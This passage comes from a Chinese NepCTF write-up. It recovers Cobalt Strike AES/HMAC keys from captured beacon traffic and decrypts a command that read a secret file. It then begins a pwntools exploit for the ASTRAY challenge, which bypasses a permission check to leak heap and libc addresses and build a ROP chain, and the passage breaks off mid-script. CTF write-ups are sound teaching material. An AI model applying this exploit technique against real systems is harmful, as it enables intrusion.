958989ce9a5dfe78fed224a8b514a375174f34418c63fc282c047b17e697755ad40e13be6a3cba3d8839361c11ea903ddfa3c009e0b81d3cb80487b9b7398a5c88b73225d51045381a36fc06f91f823b01afeab1c40c7eb355696f40d7f0dcecc45da98b6ccf6b5f22687d032753d58e6e8f3cb5b4155652ceb1abc0ebf7cee35e2d736da6a6586bd18c3cd4b954aa2a7af8b26d41f4a2f660d4d11ac879507868290f914bb5a9605395b57e0dd28ecf774407bde6dc651b9cc25f11d0357c3e4f253f715e9a4124b2b45f6643732b69d5bd0355dbe14d61700d2590ac90664000bb909d9b930bedd3fe98d70b568bb5d7176d1da2cfe769dc96a1c54caa4f6664971e56c08adaf18b84eccc3be1b52af0c04fce66766648193eabc6662e547cfc25e678c6ec426b7cc73773c729962181788541f0b52a953edb2ac71190157f3aaa440590fd69255c95b6f1c76a41ef7998f092462a76d62f82568b218549f570d4bda431125f7920ecf87d5eaaad812c6260ab4627436ba18d86034a8e686bc24e5774c4a931a5b523f6274d2bbbac77fa753a00ec2eda015380162be9a6ca6bc8ab800b8c8a731b2ab5c6646d715ce188e40953d9b6b73cb2ed189f994e1e1f48a7a38298f5905a014291211dc46dad54dbb2948fca38f148a6f2abe8bcd5d6f542f313d0aadc23610708ad9b06b6c132b74fbe2dc4ca2dcb97e08f89b1304f0054705a04f8167b63d1e1bcafb3b9fa18d52ad9c893708a67a9d6b7310d7f3d92df9f54bf6a854293ac0be9206c9af65861c5e0c45df0c8e2663eeb9f95f453599df776bbfe2b493d0c6d8cd3e5922a60acb4be94c0f3fe9311923a4c3791ee8e56d452ecb94ab56f3f20f2ec2e8fe342bc6edad224d841ba93dd005f20eabb3206f20ae30f31c9efd91fd18e81ebfafefacd468fda56072572a8ab4287b5de665e463b86d74ae9452dc6a3307de52c73c7989216bff28dc0a14c22bf427ff507f17ceec0cafb1eca4985bb40bba7f91fc776c076318289cb87d9cb85b98a18f17f5ae086657758eefdd96aa68d0c45802bba5a3a9b7355ae40b448e843412835cde8a096b8d40fd8e38390c4c2f0d63c2dd3e12ec7ddf2034c99a539cb9ad0bc2b4e63a65b7d73a239870053836ec102152b90fbc5c2681eaf717b9af7aef83373b994a7205b347c8af5e781c92dda72bbdf7d855aa4fbb576651334082d29628afc4b53c48542ac1c332618040efb349f98b537772003c8e9b4b6b94c1692908cee1376bcf5c3e454f8bca9f6715d3baab4588e2d2f9905aeac632f082e21b52838eacf5b029701d0447ac3c1ed32cdd354376490d1417a688f1d6d66a9de059280d0295332de267fdb3873d8332207db5f1c8c9d05337ad8a403a5695c697f136232ee672efa9079d95924a116b3ace96ebae02257d62707449bf50833b294f7c03c16f98babc2d1be8c777f30ce6445aaae846fef743b784c733733bf8ed283e149bddc28ea10d2472abe19247f04355dffc780cb42f9e2d98312f78a0faacd40472f1ce03a06f00e9adfa12c8e055ab56d9676f8205cdeb7edb3d0aa06011386452ebe8a7eccb418019acb459e0d7fe2830e9000ffc4898cbe10f05462eae2cdd638e5561a4caec9f16078957e6f5e95f437b1e81ea63edcc46090defe8b92ac6535296a072236e48773434eeabc7ca6069b560ee0c0667439cae7590b2bbcbbf63e86ba43156637d6f4d50c98f318d597b5467c520e906e8239173d937dd2857118cac7f7bcac04bcdbeb176e37f8acb61aa99df2afb63beb139a5077c96091c7ba90e2dfb482520ff927d9594f8d8d8c3df38b186386aeaf4ad26d24c51847de5b9825ddc9d1951f429ab4b0bfa22ea213099f6ca6e018247fb4402f757a20dbd33d9323153c0527f130cfdffa5e913f78e40bfb63b8a8c87db8cd3302ec64766455893f5eed21be50547d09e6da127aa3e8133ed9e3f92c49d6f13425ef332f70bc4a6d6b07df6c9f7b213855383bd2c359962aa</span><br><span class="line"></span><br><span class="line">Packet number: 217</span><br><span class="line">HTTP request</span><br><span class="line">http://192.168.27.132:12580/ca</span><br><span class="line">Length raw data: 3264</span><br><span class="line">2f2b30a0854b379d28b292a83812e105b85376144b8f8bc3d8679ad449df277b4cdeb165cb7f4e16308efa5d3b9772c4fbf7a3a7fa1ba96d28018f9f06384a214efa478990a5949f4040a66865055f55bd7d40982fa430c25c514c748b495e86d8d5237920ba5241bb995a9ecac0c6e13661aee01cd6efdb6b1ca5cf1c1cec7bc59f41293ca6d10962ca4b206692f7288655f24c41a8c789c6692f5d555f6b9b98ded41660efd29d09c2a5dbefd319bac44ec7058da39cfed3ba716ca0f5c7cdf6abce2f3276026554efe72860fb99ab652da70f40641a473d386cf41b6f2087c66fd0ba9d3fb00143f05b99fa0c03f25a502b937d755abedb13e073d94a56530ed9b957b4aee702b66b7614f7d0d507b1131c1826c82bc9e40fcf8cec7c937f0d5308c598fa12f37d6a7ba10e245e51a4c790829c9e08f74e37abbb9a677f3310db7b3c5d623f3947b31baca921de8a1baad27ec5e12780c30aaff0bd7030b83b34b8955218e8bf5a541fc95540159c2a5b32577d383746cd87d4526a64cd5f7938c41b2f3ab9cd87773e99bed6248524e30dcba9704b204d78a885b9c53f26eaf41da0e0e7e0ebdb53f7ae69980bada71c9db742e5bb27ec86a79d7296bd3037d1306c270b4f894f1a14939f740392b4004ce45410c39f21c44b3f602d1634818d42012298a105b671abaa6e6b9fcadb4b002443be57a9295068c229ecd2bb074d5d463d054d5ab030c1305dff58f5113330a21cb130d1929b1e517961e456e439089030be04ed1b781bf18f32ca8d361038d755149d998cad54e582e707e7fea023cfa4982d99b7804d3d5dddb6d62efd7607cf9c2a8c67d079430075f023e461bafbf44c233e22af440f69d1d1efda3ed8cf01417eb2aa58fe3a366597416058d7077f5bf3a013660ac91e29ad9ae70f214891c69000724d7f4f4faf592a08b98247ad56bab6c65b196fedcf4a761a71f73681d89b1256930d1ed5bbd968ed447d3603ef0765b5bb2a071803842fdce6454b4976b2e2c319bae190066c10ce0e9702425982beda8e6b83b29a0048bcf09a2382cb5d660104b2e76226507ecbc1cbe2559ba73688c641b49f5d1beffaeb8e5fbeea2f832985ce188ba4bb670a45a764dc2bb17f949eea84283d1b76df74b6bb44951159a1d38e6ebd5da13d03707357adb7cf1525a4198600ae0e6978370c21822ceb9739ed47361c9b979413b1d019d64a53b1fec13130326042d615b69333aa9b76aceeb515dceb05b995d3c19fe4ecb35d33f8f96286d7e239b64c9b22c0f22ded032cd797e79716c4e01b7844c51169651c91610df649538e6b132fbabb09088f51da358b53218c01eedd8287f053d9b36b6b719ca6a980162ccfb635aa18c7cd51d1786d63e98b34d1874a5cfa3e2cf41622d0a740f9d359d2cdd76a74b022c920f9ac30aebe71482b9fc38fc4addb8850d5b4e41d1b4009e1ea1e91562b7644a0c3282baef39f606225243dea1e11f8f43a189f7bec94e4aa47daedf2b79636337a90a229d37342042d18e2f1fadf93b4faf1e3ae2ad5b456215e5a9c6a8033f8282e21784d427514193660e0365f74120d5ee37237ac8fb01461148ede97f40cb39dcd0a3fbf41eeca443e3c5b5016c09bc504d4643db517ca98a873fa76ce64c7ba9c3604e3763342b261e1019a7973785746f13fe9cad40ba06417af6e486b993f9f58b58b57d6ad6742b0ef5ca1bf5b5f1b9de9d2de4ad89cacd1780bad8b179d90ea69f29d3725dac60c2dd0c6d51f2683af86d0249560cc943cc7b9c88f338ac6d688e364e2fd5d7ba801ef341ca6069089495283620eecca28033c8dee8d56fb0671e27e225051c12faa1f1f66b885649c3fb0b784950a532c76d165cef2f92bd24a9d43eb7774c755be576fb4dca0de6215235c6b186fb1a5ffe6f6ff2a0d0291a7ac806ca6ff6ad56857ceb936803415775a895ae29e123d9134ab53228debca40d0d64f27d3eef4b658174dc249758251ca6a3749f63efa9d978a03a712f1236d4e7d07b148570b25d338f81b246e78aac90e2aade72944668a1ae087cd5f56fb5965b502afd7f4d885bdda7f192c607027af35e0bf59556790e6fc1ea0288fb55a8380f249dabf38f5d64c15a95f9036c79911b3b39c2e15347bc235746aee233fcc7957739bb49952e2df9ec906c0dca1d97606d11df2375d1afd61e5356a661fb9f395312113643c6a49b37fd2b6c32f1453da020b83909622620495164fa127c8e97476717b6514d3d37d82f770c4323f997eec85db9462f0bb7f6bcd6678db2cb92d099a8c4035d1c538e5b620857c2f85a99740c62b4341e99aa6ee48a8ec639957fd92e1e0ca4c7e714afa0a93ae892ed9161950488e931703e7b7696553b9d47e5e1b98b3afc26aa46c483a4a4820203d455a1777f97fc05dc31f480a12d51ab2014f127fb0b3133e8e6af56f726530ebbee77bfaf6a11731be59b988f58eee4ced5cc9ad910b8829df073c047b45ceea3e9c1ae838f548f7b5978bff4457d1af72008429f34e89f9bfefa190ed18a361309b3526becd9770701da8a7aaed60eaf5e6a42cd8e958989ce9a5dfe78fed224a8b514a375174f34418c63fc282c047b17e697755ad40e13be6a3cba3d8839361c11ea903ddfa3c009e0b81d3cb80487b9b7398a5c88b73225d51045381a36fc06f91f823b01afeab1c40c7eb355696f40d7f0dcecc45da98b6ccf6b5f22687d032753d58e6e8f3cb5b4155652ceb1abc0ebf7cee35e2d736da6a6586bd18c3cd4b954aa2a7af8b26d41f4a2f660d4d11ac879507868290f914bb5a9605395b57e0dd28ecf774407bde6dc651b9cc25f11d0357c3e4f253f715e9a4124b2b45f6643732b69d5bd0355dbe14d61700d2590ac90664000bb909d9b930bedd3fe98d70b568bb5d7176d1da2cfe769dc96a1c54caa4f6664971e56c08adaf18b84eccc3be1b52af0c04fce66766648193eabc6662e547cfc25e678c6ec426b7cc73773c729962181788541f0b52a953edb2ac71190157f3aaa440590fd69255c95b6f1c76a41ef7998f092462a76d62f82568b218549f570d4bda431125f7920ecf87d5eaaad812c6260ab4627436ba18d86034a8e686bc24e5774c4a931a5b523f6274d2bbbac77fa753a00ec2eda015380162be9a6ca6bc8ab800b8c8a731b2ab5c6646d715ce188e40953d9b6b73cb2ed189f994e1e1f48a7a38298f5905a014291211dc46dad54dbb2948fca38f148a6f2abe8bcd5d6f542f313d0aadc23610708ad9b06b6c132b74fbe2dc4ca2dcb97e08f89b1304f0054705a04f8167b63d1e1bcafb3b9fa18d52ad9c893708a67a9d6b7310d7f3d92df9f54bf6a854293ac0be9206c9af65861c5e0c45df0c8e2663eeb9f95f453599df776bbfe2b493d0c6d8cd3e5922a60acb4be94c0f3fe9311923a4c3791ee8e56d452ecb94ab56f3f20f2ec2e8fe342bc6edad224d841ba93dd005f20eabb3206f20ae30f31c9efd91fd18e81ebfafefacd468fda56072572a8ab4287b5de665e463b86d74ae9452dc6a3307de52c73c7989216bff28dc0a14c22bf427ff507f17ceec0cafb1eca4985bb40bba7f91fc776c076318289cb87d9cb85b98a18f17f5ae086657758eefdd96aa68d0c45802bba5a3a9b7355ae40b448e843412835cde8a096b8d40fd8e38390c4c2f0d63c2dd3e12ec7ddf2034c99a539cb9ad0bc2b4e63a65b7d73a239870053836ec102152b90fbc5c2681eaf717b9af7aef83373b994a7205b347c8af5e781c92dda72bbdf7d855aa4fbb576651334082d29628afc4b53c48542ac1c332618040efb349f98b537772003c8e9b4b6b94c1692908cee1376bcf5c3e454f8bca9f6715d3baab4588e2d2f9905aeac632f082e21b52838eacf5b029701d0447ac3c1ed32cdd354376490d1417a688f1d6d66a9de059280d0295332de267fdb3873d8332207db5f1c8c9d05337ad8a403a5695c697f136232ee672efa9079d95924a116b3ace96ebae02257d62707449bf50833b294f7c03c16f98babc2d1be8c777f30ce6445aaae846fef743b784c733733bf8ed283e149bddc28ea10d2472abe19247f04355dffc780cb42f9e2d98312f78a0faacd40472f1ce03a06f00e9adfa12c8e055ab56d9676f8205cdeb7edb3d0aa06011386452ebe8a7eccb418019acb459e0d7fe2830e9000ffc4898cbe10f05462eae2cdd638e5561a4caec9f16078957e6f5e95f437b1e81ea63edcc46090defe8b92ac6535296a072236e48773434eeabc7ca6069b560ee0c0667439cae7590b2bbcbbf63e86ba43156637d6f4d50c98f318d597b5467c520e906e8239173d937dd2857118cac7f7bcac04bcdbeb176e37f8acb61aa99df2afb63beb139a5077c96091c7ba90e2dfb482520ff927d9594f8d8d8c3df38b186386aeaf4ad26d24c51847de5b9825ddc9d1951f429ab4b0bfa22ea213099f6ca6e018247fb4402f757a20dbd33d9323153c0527f130cfdffa5e913f78e40bfb63b8a8c87db8cd3302ec64766455893f5eed21be50547d09e6da127aa3e8133ed9e3f92c49d6f13425ef332f70bc4a6d6b07df6c9f7b213855383bd2c359962aa</span><br><span class="line"></span><br><span class="line">Packet number: 224</span><br><span class="line">HTTP request POST</span><br><span class="line">http://192.168.27.132:12580/submit.php?id=1389642286</span><br><span class="line">Length raw data: 68</span><br><span class="line">00000040ad0baebef6f64a60ecffdb0594a6f24f90e979d9b5cdecc44649cb939883b77fb1b5e021d59f9234d97ba8384f808f631e6acf73a17b1cb579651454a261ecac</span><br></pre></td></tr></table></figure></div>

<p>然后再用cs-extract-key来解密数据，可以得到AES Key和HMAC Key</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AES Key:  a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7</span><br><span class="line">HMAC Key: 35d34ac8778482751682514436d71e09</span><br></pre></td></tr></table></figure></div>

<p>接着再来解密CobalStrike流量即可，可以参考本人博客<a class="link"   target="_blank" rel="noopener" href="https://1cepeak.cn/posts/cobaltstrike-traffic-analysis/" >https://1cepeak.cn/posts/cobaltstrike-traffic-analysis/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgz7HnicesTmPOYLCNNWA9uolCWuU4u35enI60HRA4vwvLADj4dmgMTHQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>找到读取敏感信息的请求包</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">cobaltstrike任务解密</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import hmac</span><br><span class="line">import binascii</span><br><span class="line">import base64</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">import hexdump</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def compare_mac(mac, mac_verif):</span><br><span class="line">        if mac == mac_verif:</span><br><span class="line">                returnTrue</span><br><span class="line">        if len(mac) != len(mac_verif):</span><br><span class="line">                print</span><br><span class="line">                &quot;invalid MAC size&quot;</span><br><span class="line">                returnFalse</span><br><span class="line"></span><br><span class="line">        result = 0</span><br><span class="line"></span><br><span class="line">        for x, y in zip(mac, mac_verif):</span><br><span class="line">                result |= x ^ y</span><br><span class="line"></span><br><span class="line">        return result == 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):</span><br><span class="line">        ifnot compare_mac(hmac.new(hmac_key, encrypted_data, digestmod=&quot;sha256&quot;).digest()[0:16], signature):</span><br><span class="line">                print(&quot;message authentication failed&quot;)</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">        cypher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">        data = cypher.decrypt(encrypted_data)</span><br><span class="line">        return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def readInt(buf):</span><br><span class="line">        return struct.unpack(&#x27;&gt;L&#x27;, buf[0:4])[0]</span><br><span class="line"></span><br><span class="line"># 接收到的任务数据</span><br><span class="line">shell_whoami= &quot;AlN4TuhtP8VGk7t+4U9A1kcARGpGBMoAVBA7qE4agx0qNpxQHiolIqvdn1/nZSoW/SQmafaxD7UuiysDKnrgD2slqM7N/95y2t8aGMEiX5I=&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">        # key源自Beacon_metadata_RSA_Decrypt.py</span><br><span class="line">        SHARED_KEY = binascii.unhexlify(&quot;a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7&quot;)</span><br><span class="line">        HMAC_KEY = binascii.unhexlify(&quot;35d34ac8778482751682514436d71e09&quot;)</span><br><span class="line"></span><br><span class="line">        enc_data = base64.b64decode(shell_whoami)</span><br><span class="line">        print(&quot;数据总长度:&#123;&#125;&quot;.format(len(enc_data)))</span><br><span class="line">        signature = enc_data[-16:]</span><br><span class="line">        encrypted_data = enc_data[:-16]</span><br><span class="line"></span><br><span class="line">        iv_bytes = bytes(&quot;abcdefghijklmnop&quot;,&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">        dec = decrypt(encrypted_data,iv_bytes,signature,SHARED_KEY,HMAC_KEY)</span><br><span class="line"></span><br><span class="line">        counter = readInt(dec)</span><br><span class="line">        print(&quot;时间戳:&#123;&#125;&quot;.format(counter))</span><br><span class="line"></span><br><span class="line">        decrypted_length = readInt(dec[4:])</span><br><span class="line">        print(&quot;任务数据包长度:&#123;&#125;&quot;.format(decrypted_length))</span><br><span class="line"></span><br><span class="line">        data = dec[8:len(dec)]</span><br><span class="line">        print(&quot;任务Data&quot;)</span><br><span class="line">        print(hexdump.hexdump(data))</span><br><span class="line"></span><br><span class="line">        # 任务标志</span><br><span class="line">        Task_Sign=data[0:4]</span><br><span class="line">        print(&quot;Task_Sign:&#123;&#125;&quot;.format(Task_Sign))</span><br><span class="line"></span><br><span class="line">        # 实际的任务数据长度</span><br><span class="line">        Task_file_len = int.from_bytes(data[4:8], byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line">        print(&quot;Task_file:&#123;&#125;&quot;.format(Task_file_len))</span><br><span class="line"></span><br><span class="line">        with open(&#x27;data.bin&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data[8:Task_file_len])</span><br><span class="line"></span><br><span class="line">        print(hexdump.hexdump(data[Task_file_len:]))</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgfInicWwIM8JetKiazzQr7R5HbA2syKvBUMdDMTE9yfLE601g3xLkNYgQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>发现执行了<code>type secret.txt</code>的命令，接着找这个请求包的返回包。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgucctW347lEkXHeYg4GoibCQzDPudBzsdsqUlgcpJ5xDia6h9fXM8R6JA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgLLacz6jq5njaCuYDpWibCvFsn3iayPr3LHKMhicDTA8shNT1s0RhpTCgw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>读取的敏感信息为<code>5c1eb2c4-0b85-491f-8d50-4e965b9d8a43</code></p>
<p>综上，最终的答案就是NepCTF<code>&#123;JohnDoe_192.168.27.132:12580_5c1eb2c4-0b85-491f-8d50-4e965b9d8a43&#125;</code></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><strong>PWN</strong></h1><h2 id="ASTRAY"><a href="#ASTRAY" class="headerlink" title="ASTRAY"></a><strong>ASTRAY</strong></h2><p>此题考察权限配置错误导致的只读页面可写</p>
<p>出题思路来源于<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/hac425/p/18543638/gpu-driver-vulnerability-technical-mystery-of-spying-on-driving-vulnerabilities-1c4woh%E7%9A%84CVE-2021-28664" >https://www.cnblogs.com/hac425/p/18543638/gpu-driver-vulnerability-technical-mystery-of-spying-on-driving-vulnerabilities-1c4woh的CVE-2021-28664 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>漏洞点就是check的不够彻底，user的操作flag可以用manager的操作flag绕过</p>
<p>本体可以有不同思路，用manager_write或者manager_visit都可以绕过，致使0堆块可控</p>
<p>分析流程可以参考以下SpaceDraG0n选手的wp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg1sfdLXTfpIcYNianecib6iaVpk0XyqKnCa7qfsaicmmibOOAZiao7SWJeGKw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgG1RzYxCr7kkTbVpvRWAnAfXK4S1PwpDs2cHdAQrVGntgXHVTox8WxQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>下面是此题的wp</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">#p=process(&#x27;./misunderstanding&#x27;)</span><br><span class="line">p=remote(&quot;0.0.0.0&quot;,8888)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;Which permission do you want to log in with?(1:manager 1000:user)\n&quot;,str(1000))</span><br><span class="line">p.sendlineafter(b&quot;user write to logs(USER_write)\n&quot;,b&#x27;USER_read\x00&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;10-19: user can visit\n&#x27;,str(0))</span><br><span class="line">p.recv(8)</span><br><span class="line">heap_base=u64(p.recv(8))-0x22d0</span><br><span class="line">code_base=u64(p.recv(8))-0x41a0</span><br><span class="line">print(hex(heap_base))</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;Which permission do you want to log in with?(1:manager 1000:user)\n&quot;,str(1000))</span><br><span class="line">p.sendlineafter(b&quot;user write to logs(USER_write)\n&quot;,b&#x27;USER_write\x00&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;10-19: user can visit\n&#x27;,str(10))</span><br><span class="line">payload=p64(0x3e8)+p64(heap_base+0x2a0+0xa10)+p64(code_base+0x3f90)+p64(0)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;Which permission do you want to log in with?(1:manager 1000:user)\n&quot;,str(1000))</span><br><span class="line">p.sendlineafter(b&quot;user write to logs(USER_write)\n&quot;,b&#x27;MANAGER_write\x00&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;10-19: user can visit\n&#x27;,str(0))</span><br><span class="line">p.sendlineafter(b&quot;Which permission do you want to log in with?(1:manager 1000:user)\n&quot;,str(1))</span><br><span class="line">p.sendlineafter(b&quot;visit user(MANAGER_visit)\n&quot;,b&#x27;MANAGER_visit\x00&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;1-19: manager can visit\n&#x27;,str(1))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendlineafter(b&#x27;2: manager visit user to write to user_logs&#x27;,str(2))</span><br><span class="line">#pause()</span><br><span class="line">payload=p64(1)+p64(heap_base+0x22d0)+p64(heap_base+0x2a0+0xa00)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;Which permission do you want to log in with?(1:manager 1000:user)\n&quot;,str(1))</span><br><span class="line">p.sendlineafter(b&quot;visit user(MANAGER_visit)\n&quot;,b&#x27;MANAGER_visit\x00&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;1-19: manager can visit\n&#x27;,str(1))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendlineafter(b&#x27;2: manager visit user to write to user_logs&#x27;,str(1))</span><br><span class="line">#pause()</span><br><span class="line">p.recv(8)</span><br><span class="line">libc_base=u64(p.recv(8))-libc.sym[&#x27;puts&#x27;]</span><br><span class="line">env_addr=libc_base+libc.sym[&#x27;environ&#x27;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system_addr=libc_base+libc.sym[&quot;system&quot;]</span><br><span class="line">rdi_addr=libc_base+0x000000000002a3e5</span><br><span class="line">rsi_addr=libc_base+0x000000000002be51</span><br><span class="line">rdx_r12_addr=libc_base+0x000000000011f2e7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;Which permission do you want to log in with?(1:manager 1000:user)\n&quot;,str(1000))</span><br><span class="line">p.sendlineafter(b&quot;user write to logs(USER_write)\n&quot;,b&#x27;USER_write\x00&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;10-19: user can visit\n&#x27;,str(10))</span><br><span class="line">payload=p64(0x3e8)+p64(heap_base+0x2a0+0xa10)+p64(env_addr)+p64(0)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;Which permission do you want to log in with?(1:manager 1000:user)\n&quot;,str(1))</span><br><span class="line">p.sendlineafter(b&quot;visit user(MANAGER_visit)\n&quot;,b&#x27;MANAGER_visit\x00&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;1-19: manager can 